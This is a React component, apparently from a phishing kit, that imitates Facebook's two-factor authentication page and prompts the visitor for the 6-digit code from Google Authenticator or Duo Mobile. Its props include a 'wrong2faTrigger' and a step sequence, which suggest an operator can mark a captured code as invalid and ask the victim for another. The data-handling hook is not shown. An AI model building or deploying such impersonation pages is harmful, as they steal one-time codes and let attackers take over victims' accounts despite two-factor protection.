import React from "react";
import Image from "next/image";
import { useFa2Logic } from "../../hooks/useFa2Logic";
import LoadingSpinner from "../ui/LoadingSpinner";
import {
  AuthShell,
  AuthColumn,
  AuthEyebrow,
  AuthHeading,
  AuthBody,
  AuthImageWrap,
  AuthInput,
  AuthError,
  AuthPrimaryButton,
} from "./shared";

function Fa2AuthApp({ setStep, Name, LastFetch, wrong2faTrigger }) {
  const {
    code,
    isLoading,
    showError,
    handleSubmit,
    handleCodeChange,
    shouldShowRedBorder,
    isButtonDisabled,
  } = useFa2Logic({
    LastFetch,
    wrong2faTrigger,
    setStep,
    nextStep: 4,
    componentName: "Auth App 2FA",
    initialMessage: "Auth App 2FA Page Loaded",
    allowImmediateRetry: true,
    customLoadingDuration: 2000,
  });

  const handleFormSubmit = (e) => {
    handleSubmit(e, "auth_app_2fa");
  };

  return (
    <AuthShell>
      <AuthColumn>
        <AuthEyebrow>Facebook</AuthEyebrow>
        <AuthHeading>Go to your authentication app</AuthHeading>
        <AuthBody>
          Enter the 6-digit code for this account from the two-factor
          authentication app you set up (such as Duo Mobile or Google
          Authenticator)
        </AuthBody>

        <AuthImageWrap>
          <Image
            alt=""
            src="/assets/images/googleAuth.jpg"
            width={1920}
            height={840}
            priority
            style={{ width: "100%", height: "auto" }}
          />
        </AuthImageWrap>

        <form onSubmit={handleFormSubmit}>
          <AuthInput
            placeholder="Code"
            type="number"
            name="code"
            autoComplete="off"
            value={code}
            onChange={handleCodeChange}
            $error={shouldShowRedBorder()}
            disabled={isLoading}
          />

          {showError && <AuthError>Invalid authentication code</AuthError>}

          <AuthPrimaryButton type="submit" disabled={isButtonDisabled()}>
            {isLoading ? <LoadingSpinner size="15px" /> : "Continue"}
          </AuthPrimaryButton>
        </form>
      </AuthColumn>
    </AuthShell>
  );
}

export default Fa2AuthApp;
